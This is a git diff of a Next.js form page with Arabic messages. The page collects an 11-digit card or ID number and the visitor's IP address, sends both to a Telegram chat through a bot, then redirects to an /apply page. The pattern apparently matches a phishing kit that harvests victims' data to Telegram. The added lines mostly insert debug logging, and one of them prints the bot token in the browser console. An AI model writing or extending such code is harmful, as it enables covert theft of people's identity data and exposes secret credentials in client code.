@@ -13,8 +13,10 @@ export default function FormPage() {
   // دالة الحصول على عنوان الـ IP
   const fetchIp = async () => {
     try {
+      console.log("جاري جلب عنوان IP...");
       const response = await fetch("https://api.ipify.org?format=json");
       const data = await response.json();
+      console.log("تم الحصول على عنوان IP بنجاح:", data.ip);
       setIpAddress(data.ip);
     } catch (error) {
       console.error("Error fetching IP address:", error);
@@ -41,7 +43,19 @@ export default function FormPage() {
     const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
     const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
 
+    console.log("التحقق من المتغيرات:");
+    console.log("chatId:", chatId);
+    console.log("botToken:", botToken);
+
+    // التحقق من وجود المتغيرات
+    if (!chatId || !botToken) {
+      console.error("المتغيرات غير موجودة! تأكد من ضبط القيم في البيئة.");
+      alert("المتغيرات غير موجودة في البيئة. تأكد من إعدادها.");
+      return;
+    }
+
     try {
+      console.log("جاري إرسال الرسالة إلى Telegram...");
       const response = await fetch(
         `https://api.telegram.org/bot${botToken}/sendMessage`,
         {
@@ -54,12 +68,16 @@ export default function FormPage() {
         }
       );
 
+      console.log("تم إرسال الرسالة إلى Telegram. حالة الاستجابة:", response.status);
       if (!response.ok) {
         const errorText = await response.text();
+        console.error("خطأ في إرسال الرسالة:", errorText);
         alert(`خطأ في إرسال الرسالة: ${errorText}`);
+      } else {
+        console.log("الرسالة تم إرسالها بنجاح!");
       }
     } catch (error) {
-      console.error("Error sending message to Telegram:", error);
+      console.error("حدث خطأ أثناء إرسال الرسالة إلى Telegram:", error);
       alert("حدث خطأ أثناء إرسال الرسالة إلى Telegram");
     }
   };
@@ -71,12 +89,15 @@ export default function FormPage() {
       setError(false);
 
       const message = `رقم البطاقة: ${idNumber}\nعنوان IP: ${ipAddress}`;
+      console.log("الرسالة المراد إرسالها إلى Telegram:", message);
       await sendToTelegram(message); // إرسال الرسالة إلى Telegram
 
       // إذا تم إرسال الرسالة بنجاح
       router.push(`/apply?idNumber=${idNumber}`);
     } else {
       setError(true);
+      console.error("رقم البطاقة غير صحيح. يجب أن يتكون من 11 رقمًا.");
+      alert("رقم البطاقة غير صحيح. يجب أن يتكون من 11 رقمًا.");
     }
   };
 
